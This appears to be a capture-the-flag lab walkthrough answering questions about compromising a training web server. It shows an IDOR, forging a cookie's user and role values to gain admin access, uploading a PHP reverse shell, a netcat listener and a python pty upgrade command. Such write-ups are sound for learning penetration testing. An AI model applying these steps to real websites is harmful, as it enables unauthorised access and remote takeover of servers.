![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/59839b59-15ea-429e-94e8-63090e1b6e7a)

This what we will do today :)
1. With what kind of tool can intercept web traffic? 
This will be just: proxy

2. What is the path to the directory on the webserver that returns a login page? 
For this kind of enumeration i recomend to use: feroxbuster, but in this lab this doesn't work. I turn on the BurpSuite and also proxy, refresh the page and traffic some packiet, there was /cdn-cgi i insert this in ffuf and i got the /cdn-cgi/login, this is answer for the question.

3. What can be modified in Firefox to get access to the upload page? 
This will be a: cookie 

4. What is the access ID of the admin user? 
Here we need to find the IDOR, i log in as a guest, and there we can see on the navbar, account i go there and in the URL you can see something intresting http://10.129.213.188/cdn-cgi/login/admin.php?content=accounts&id=2 i tryed change this from 2 to 1 and i got the Cookie-user: 34322

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/c8690ed3-953e-4c4b-b63c-8cbb4ba4b17c)

5. On uploading a file, what directory does that file appear in on the server? 
Again i used ffuf to do some recon, to find the directory, after few secend i did it, here's the results:
This will be /uploads

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/06067e2c-e923-4675-9630-ee955d15f16c)

6. What is the file that contains the password that is shared with the robert user? 
We need to step back little bit, the target is upload the reverse-shell, first what i did is turn on the burp and intercept the traffic. Then change the in Cookie=user: 2233 role=guest to, Cookie=user: 34322 role=admin, you will get access as a admin, then cp on your computer the reverse-shell ~by this command: cp /usr/share/webshells/php/php-reverse-shell.php ~

You need to open with nano or vim, and change this paramiter: $ip, on your own ip.

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/0e210008-ffd0-4c87-8d24-74181ad3cdb6)

If u change, let's go upload this RCE :P, but rember to change the Cookie=user:, role= without this u can't upload file on the server. If u did this, you can see the announcement  The file php-reverse-shell.php has been uploaded. 
No go to the /uploads, before that rember to turn on the netcat -lvnp 1234 to get a RCE. Something was wrong, i tryed to go /uploads be only what i can see is Forbidden, then /uploads/php-reverse-shell.php but still nothing, i tryed again upload this RCE and i got this :P
Rember to google better shell python and insert in your shell: python3 -c 'import pty; pty.spawn("/bin/bash")'

![obraz](https://github.com/Anogota/Don-t-forget-to-contemplate/assets/143951834/1b600a43-7e46-43fc-acd8-94412accdd5b)



